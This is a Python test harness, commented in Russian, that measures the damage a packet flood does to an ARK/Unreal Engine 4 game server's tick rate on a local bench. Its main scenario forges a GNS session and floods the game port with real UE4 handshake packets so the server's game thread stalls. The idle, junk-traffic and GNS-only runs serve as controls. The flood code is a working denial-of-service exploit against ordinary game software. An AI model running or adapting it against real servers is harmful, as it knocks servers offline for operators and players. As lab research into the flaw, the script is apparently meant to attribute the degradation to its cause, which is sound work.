# -*- coding: utf-8 -*-
"""
ark_lab_gns_fps_test.py — строгое локальное измерение воздействия вектора
на FPS/TPS сервера с контрольными сценариями.

Задача: измерить эффект по FPS сервера (а не по косвенным признакам) и
attribутировать его: деградация должна быть вызвана именно инъекцией
UE4-пакета (созданием UNetConnection), а не самим трафиком.

Два независимых источника сигнала:
  1) плагин NetGuard: tps, tickMs, tickMsMax, connectionAttempts - это
     здоровье игрового треда (метрика обновляется на тике, поэтому при
     тяжёлой деградации она отстаёт - снимаем и после флуда);
  2) RTT до query-порта сервера (A2S) - задержка обработки на стороне
     сервера, НЕ зависит от плагина (сторонний контроль).

Сценарии (одинаковый бюджет пакетов и одинаковая длительность):
  C0  простой (idle)            - базовая линия;
  C1  мусор на 7778             - стоимость «просто трафика» без GNS;
  C2  GNS-сессия + мусор в data - стоимость транспорта GNS без UE4-содержимого;
  C3  GNS-сессия + UE4-хендшейк  - ПОЛНЫЙ ВЕКТОР (создание UNetConnection).

Пример:
    python ark_lab_gns_fps_test.py --count 200000 --seconds 15
    python ark_lab_gns_fps_test.py --only full --count 400000
"""
from __future__ import annotations

import argparse
import os
import socket
import statistics
import struct
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
from ark_lab_metrics import NetGuardClient  # noqa: E402
from ark_lab_gns_amp import (  # noqa: E402
    DEFAULT_UE4_FIRST, DEFAULT_UE4_PREFIX, forge_session, gns_data,
)

A2S_INFO = b"\xff\xff\xff\xffTSource Engine Query\x00"


def a2s_rtt(host: str, port: int, timeout: float = 1.0) -> float | None:
    """Задержка ответа query-порта (мс) - независимый от плагина сигнал."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    t0 = time.perf_counter()
    try:
        s.sendto(A2S_INFO, (host, port))
        s.recvfrom(4096)
        return (time.perf_counter() - t0) * 1000.0
    except (socket.timeout, OSError):
        return None
    finally:
        s.close()


class Sampler(threading.Thread if False else object):  # placeholder, заменяется ниже
    pass


import threading  # noqa: E402


class Watch(threading.Thread):
    """Фоновый опрос: TPS/tickMs плагина + RTT до query-порта.

    ВАЖНО: у сэмплера свой TCP-клиент к плагину. Общий сокет с основным
    потоком приводит к перемешиванию ответов (команды идут по одному сокету
    последовательно) и к мусорным значениям метрик.
    """

    def __init__(self, metrics_host: str, metrics_port: int, host: str,
                 query_port: int, interval: float = 0.25):
        super().__init__(daemon=True)
        self.m = NetGuardClient(metrics_host, metrics_port).connect()
        self.host = host
        self.query_port = query_port
        self.interval = interval
        self.tps: list[float] = []
        self.tick: list[float] = []
        self.rtt: list[float | None] = []
        self.attempts: list[int] = []
        self._stop = threading.Event()

    def run(self) -> None:
        while not self._stop.is_set():
            try:
                st = self.m.status()
                self.tps.append(float(st.get("tps") or 0.0))
                self.tick.append(float(st.get("tickMs") or 0.0))
                self.attempts.append(int(st.get("connectionAttempts") or 0))
            except Exception:  # noqa: BLE001
                self.tps.append(0.0)
                self.tick.append(0.0)
                self.attempts.append(0)
            self.rtt.append(a2s_rtt(self.host, self.query_port))
            self._stop.wait(self.interval)

    def stop(self) -> None:
        self._stop.set()
        try:
            self.m.close()
        except Exception:  # noqa: BLE001
            pass

    def summary(self) -> dict:
        rtt_ok = [r for r in self.rtt if r is not None]
        return {
            "tps_min": min(self.tps) if self.tps else 0.0,
            "tps_avg": statistics.mean(self.tps) if self.tps else 0.0,
            "tick_max": max(self.tick) if self.tick else 0.0,
            "tick_avg": statistics.mean(self.tick) if self.tick else 0.0,
            "rtt_min": min(rtt_ok) if rtt_ok else None,
            "rtt_med": statistics.median(rtt_ok) if rtt_ok else None,
            "rtt_max": max(rtt_ok) if rtt_ok else None,
            "rtt_lost": len(self.rtt) - len(rtt_ok),
            "conn_delta": (self.attempts[-1] - self.attempts[0]) if self.attempts else 0,
        }


# ---------------------------------------------------------------------------
# Сценарии
# ---------------------------------------------------------------------------
def sc_idle(host, game_port, query_port, m, count, seconds, metrics_host, metrics_port) -> dict:
    w = Watch(metrics_host, metrics_port, host, query_port)
    w.start()
    time.sleep(seconds)
    w.stop()
    return w.summary()


def sc_junk(host, game_port, query_port, m, count, seconds, metrics_host, metrics_port) -> dict:
    """Только мусорные датаграммы на игровой порт (без GNS)."""
    payload = b"\x00" * 64
    socks = []
    for _ in range(4):
        sk = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sk.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 << 20)
        sk.bind(("0.0.0.0", 0))
        socks.append(sk)
    w = Watch(metrics_host, metrics_port, host, query_port)
    w.start()
    t0 = time.time()
    sent = 0
    while time.time() - t0 < seconds and sent < count:
        for sk in socks:
            for _ in range(500):
                try:
                    sk.sendto(payload, (host, game_port))
                except OSError:
                    pass
                sent += 1
    for sk in socks:
        sk.close()
    w.stop()
    r = w.summary()
    r["packets"] = sent
    return r


def sc_gns(host, game_port, query_port, m, count, seconds, metrics_host, metrics_port,
            ue4: bool) -> dict:
    """GNS-сессия + data-пакеты.

    ue4=True  - payload = настоящий UE4-хендшейк (вектор: создаются UNetConnection);
    ue4=False - payload = мусор той же длины (контроль: стоимость только транспорта).
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(3.0)
    sock.bind(("0.0.0.0", 0))
    srv_conn_id = forge_session(host, game_port, sock, verbose=False)
    if ue4:
        payload = bytes.fromhex(DEFAULT_UE4_PREFIX) + bytes.fromhex(DEFAULT_UE4_FIRST)
    else:
        payload = b"\x5a" * (len(bytes.fromhex(DEFAULT_UE4_PREFIX)) + len(bytes.fromhex(DEFAULT_UE4_FIRST)))
    w = Watch(metrics_host, metrics_port, host, query_port)
    w.start()
    t0 = time.time()
    sent = 0
    while time.time() - t0 < seconds and sent < count:
        for _ in range(2000):
            if sent >= count:
                break
            try:
                sock.sendto(gns_data(srv_conn_id, (sent + 1) & 0xFFFF,
                                     (sent + 1) & 0xFFFFFFFF, payload), (host, game_port))
            except OSError:
                pass
            sent += 1
    sock.close()
    w.stop()
    r = w.summary()
    r["packets"] = sent
    return r


SCENARIOS = {
    "idle": ("C0 простой (idle)",
             lambda h, g, q, m, c, s, mh, mp: sc_idle(h, g, q, m, c, s, mh, mp)),
    "junk": ("C1 мусор на 7778", sc_junk),
    "gns-junk": ("C2 GNS + мусор в data",
                 lambda h, g, q, m, c, s, mh, mp: sc_gns(h, g, q, m, c, s, mh, mp, False)),
    "full": ("C3 GNS + UE4-хендшейк (вектор)",
             lambda h, g, q, m, c, s, mh, mp: sc_gns(h, g, q, m, c, s, mh, mp, True)),
}


def wait_recover(m: NetGuardClient, target: float, timeout: float = 120.0) -> float:
    """Ждёт, пока сервер восстановится до `target` TPS (иначе сценарии не сравнимы)."""
    t0 = time.time()
    tps = 0.0
    while time.time() - t0 < timeout:
        tps = float(m.status().get("tps") or 0.0)
        if tps >= target:
            break
        time.sleep(2.0)
    return tps


def measure_stall(m: NetGuardClient, baseline: float, timeout: float = 120.0) -> dict:
    """После флуда: сколько секунд игровой тред заблокирован и как быстро оживает.

    Метрика TPS обновляется на игровом тике: если тик не идёт - TPS = 0,
    то есть игровой тред заблокирован дольше окна измерения плагина.
    """
    t0 = time.time()
    stall = 0.0          # суммарное время с TPS < 50 % базы
    first_bad = None     # момент первого провала
    back = None          # момент восстановления
    while time.time() - t0 < timeout:
        tps = float(m.status().get("tps") or 0.0)
        if tps < baseline * 0.5:
            if first_bad is None:
                first_bad = time.time() - t0
            stall += 0.5
        elif first_bad is not None and back is None:
            back = time.time() - t0
            break
        time.sleep(0.5)
    return {"stall_sec": round(stall, 1),
            "first_degraded_at": round(first_bad, 1) if first_bad is not None else None,
            "recovered_at": round(back, 1) if back is not None else None,
            "tps_final": float(m.status().get("tps") or 0.0)}


def main() -> int:
    ap = argparse.ArgumentParser(description="Строгое измерение воздействия по FPS/TPS (локальный стенд)")
    ap.add_argument("--host", default="192.168.8.218")
    ap.add_argument("--game-port", type=int, default=7778)
    ap.add_argument("--query-port", type=int, default=27016)
    ap.add_argument("--metrics-host", default="127.0.0.1")
    ap.add_argument("--metrics-port", type=int, default=27101)
    ap.add_argument("--count", type=int, default=200000)
    ap.add_argument("--seconds", type=float, default=15.0)
    ap.add_argument("--cooldown", type=float, default=25.0, help="пауза между сценариями (восстановление)")
    ap.add_argument("--stall-timeout", type=float, default=90.0,
                    help="сколько секунд измерять залипание игрового треда после флуда")
    ap.add_argument("--only", choices=sorted(SCENARIOS), action="append")
    ap.add_argument("--json", default="")
    args = ap.parse_args()

    names = args.only if args.only else list(SCENARIOS)
    m = NetGuardClient("127.0.0.1", args.metrics_port).connect()
    results: dict[str, dict] = {}
    for key in names:
        title, fn = SCENARIOS[key]
        # ждём восстановления сервера до базового уровня, иначе сценарии не сравнимы
        base = float(m.status().get("tps") or 0.0)
        if base < 19.0:
            print("    ... ожидание восстановления сервера (TPS сейчас %.1f)" % base)
            base = wait_recover(m, 19.0, timeout=180.0)
            print("    ... восстановлен, TPS = %.1f" % base)
        st0 = m.status()
        tps0 = float(st0.get("tps") or 0.0)
        tick0 = float(st0.get("tickMs") or 0.0)
        print("\n>>> %s (%s)" % (title, key))
        r = fn(args.host, args.game_port, args.query_port, m, args.count, args.seconds,
               args.metrics_host, args.metrics_port)
        # замер сразу после флуда (метрика плагина отстаёт)
        time.sleep(2.0)
        st1 = m.status()
        tps_after = float(st1.get("tps") or 0.0)
        tick_after = float(st1.get("tickMs") or 0.0)
        stall = measure_stall(m, tps0, timeout=args.stall_timeout)
        r.update({"tps0": tps0, "tick0": tick0, "tps_after": tps_after, "tick_after": tick_after,
                  "stall": stall, "key": key})
        results[key] = r
        print("    пакетов=%-7s TPS: было %-6s минимум %-6s среднее %-6s после %-6s | tickMs: было %-5s максимум %-6s"
              % (r.get("packets"), tps0, r["tps_min"], round(r["tps_avg"], 1), tps_after,
                 tick0, r["tick_max"]))
        print("    A2S RTT: мин %s / медиана %s / макс %s мс, потерь %d | соединений %+d" % (
            r["rtt_min"], r["rtt_med"], r["rtt_max"], r["rtt_lost"], r["conn_delta"]))
        print("    ЗАЛИПАНИЕ игрового треда: %.1f с (провал с %s с, восстановление на %s с, TPS в конце %.1f)" % (
            stall["stall_sec"], stall["first_degraded_at"], stall["recovered_at"], stall["tps_final"]))
        time.sleep(args.cooldown)

    print()
    print("=" * 122)
    print("СРАВНЕНИЕ СЦЕНАРИЕВ (локальный стенд Server2) - где именно возникает деградация FPS")
    print("=" * 122)
    print("%-28s %8s %9s %9s %9s %9s %9s %8s" % (
        "сценарий", "пакетов", "TPS было", "TPS мин", "TPS после", "tick max", "RTT макс", "соедин."))
    for key in names:
        title, _ = SCENARIOS[key]
        r = results.get(key)
        if not r:
            continue
        print("%-28s %8s %9s %9s %9s %9s %9s %8d" % (
            title, r.get("packets"), r.get("tps0"), r.get("tps_min"), r.get("tps_after"),
            r.get("tick_max"), r.get("rtt_max"), r.get("conn_delta") or 0))
    print("-" * 122)
    print("Вывод: если C1/C2 не деградируют, а C3 деградирует - эффект даёт именно")
    print("инъекция UE4-пакета (создание UNetConnection), а не объём трафика.")
    print("=" * 122)
    if args.json:
        import json
        with open(args.json, "w", encoding="utf-8") as f:
            json.dump(results, f, ensure_ascii=False, indent=2)
        print("сохранено: %s" % args.json)
    m.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
